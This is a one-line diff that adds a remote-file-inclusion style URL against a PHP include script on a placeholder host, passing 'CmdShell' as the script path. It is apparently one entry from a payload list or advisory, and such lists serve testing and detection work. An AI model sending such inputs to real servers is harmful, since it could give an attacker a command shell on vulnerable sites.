@@ -1,0 +1,1 @@
+http://www.example.com/path/include/common.php?script_path=CmdShell
